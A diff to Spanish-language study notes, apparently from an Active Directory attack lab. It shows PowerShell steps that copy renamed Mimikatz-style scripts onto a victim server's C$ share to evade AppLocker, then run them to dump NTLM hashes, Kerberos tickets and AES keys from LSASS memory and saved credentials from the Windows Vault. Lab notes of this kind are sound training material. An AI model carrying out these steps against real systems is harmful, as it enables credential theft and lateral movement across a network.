@@ -63,13 +63,22 @@ TheKatEx se utiliza porque, aunque AppLocker permite ejecutar scripts desde ruta
 
 ```powershell 
 # Esto se puede hacer porque el usuario que se tiene tiene acceso administrativo en el server 
-❯ Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'  
+
+Paso 1: 
 # Ejecutar desde la máquina de atacante 
+❯ Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'  
 # Copiar el archivo al server víctima en la ruta donde se pueden ejecutar los scripts
+
+❯ Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 ```powershell 
+Paso 2: 
 ❯ cd C:\Program Files
 ❯ ls 
-❯ .\Invoke-TheKatEx-keys-stdX.ps1   # Lo ejecutamos en el server víctima
+❯ .\Invoke-TheKatEx-keys-stdx.ps1   # Extraer material de autenticación activo desde memoria LSASS, como hashes NTLM, tickets Kerberos y claves AES de usuarios logueados. LSAAS es qué está autenticado ahora. 
+
+
+Paso 3: 
+❯ .\Invoke-TheKatEx-vault-stdx.ps1   # Extraer credenciales almacenadas persistentemente en Windows Credential Manager/Vault, como usuarios y contraseñas guardadas por servicios, aplicaciones o conexiones. Qué credenciales fueron guardadas para reutilizar después.  
 ```
